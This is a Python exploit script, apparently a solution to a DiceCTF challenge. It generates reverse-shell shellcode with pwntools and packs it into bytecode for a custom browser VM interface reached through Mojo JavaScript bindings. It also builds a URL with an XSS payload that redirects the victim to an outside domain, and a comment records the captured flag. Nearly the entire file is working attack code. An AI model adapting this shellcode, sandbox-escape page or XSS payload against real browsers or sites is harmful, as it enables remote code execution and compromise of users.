from pwn import *
context.arch = 'amd64'

# cat /flag-8cc1f041ca1d8eeec933c6b436bb72cd.txt
# dice{danc1ng_0n_f1r3_c71d311}

sc = shellcraft.amd64.connect('127.0.0.1', 65511)
sc += shellcraft.amd64.dup()
sc += shellcraft.amd64.sh()

b = asm(sc)

'''
for i, x in enumerate(b):
    print('stb [r1+%d], %d' % (64 + i, x))
    '''

rbpf = [183, 3, 0, 0, 3, 0, 0, 0, 103, 3, 0, 0, 32, 0, 0, 0, 183, 1, 0, 0, 0, 2, 4, 0, 15, 49, 0, 0, 0, 0, 0, 0, 121, 21, 0, 0, 0, 0, 0, 0, 183, 0, 0, 0, 192, 0, 0, 0, 31, 5, 0, 0, 0, 0, 0, 0, 183, 7, 0, 0, 64, 0, 0, 0, 15, 87, 0, 0, 0, 0, 0, 0, 121, 18, 8, 0, 0, 0, 0, 0, 183, 0, 0, 0, 172, 33, 145, 26, 31, 2, 0, 0, 0, 0, 0, 0, 183, 4, 0, 0, 82, 127, 102, 23, 15, 36, 0, 0, 0, 0, 0, 0, 123, 65, 8, 0, 0, 0, 0, 0, 183, 4, 0, 0, 7, 0, 0, 0, 123, 65, 16, 0, 0, 0, 0, 0, 183, 4, 0, 0, 174, 207, 219, 33, 15, 36, 0, 0, 0, 0, 0, 0, 123, 65, 24, 0, 0, 0, 0, 0, 183, 4, 0, 0, 0, 64, 0, 0, 191, 86, 0, 0, 0, 0, 0, 0, 159, 70, 0, 0, 0, 0, 0, 0, 31, 101, 0, 0, 0, 0, 0, 0, 123, 65, 32, 0, 0, 0, 0, 0, 123, 81, 40, 0, 0, 0, 0, 0, 183, 4, 0, 0, 20, 164, 227, 20, 15, 36, 0, 0, 0, 0, 0, 0, 123, 65, 48, 0, 0, 0, 0, 0, 123, 113, 56, 0, 0, 0, 0, 0]

print(len(rbpf))
for i, x in enumerate(b):
    # print('stb [r1+%d], %d' % (64 + i, x))
    rbpf += [114, 1, 64 + i, 0, x, 0, 0, 0]
rbpf += [149, 0, 0, 0, 0, 0, 0, 0]

jsexp = b'''
<script src="/mojojs/mojo_bindings.js"></script>
<script src="/mojojs/gen/third_party/blink/public/mojom/otter/otter_vm.mojom.js"></script>
<script>
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
async function exploit() {
        const ptr = new blink.mojom.OtterVMPtr();
        Mojo.bindInterface(
                blink.mojom.OtterVM.name,
                mojo.makeRequest(ptr).handle,
        );
        await sleep(100);
        let data = new Uint8Array(%s);
        let entrypoint = 0;
        await ptr.init(data, entrypoint);
        data = new Uint8Array(1_024);
        var resp = (await ptr.run(data)).resp;
}
setTimeout(exploit, 1000);
</script>
''' % (repr(rbpf).encode('utf-8').replace(b' ', b''))
open('index.html', 'wb').write(jsexp)

final = '<style onload=location="//a.bbbb.cc">'

history = bytearray([1, 7, 7, 6, 13, 101, 157, 181, 197, 199, 1, 1])
code = '?code=' + base64.b64encode(history).decode('utf-8') + ';' + final
print('https://ddg.mc.ax/' + code)
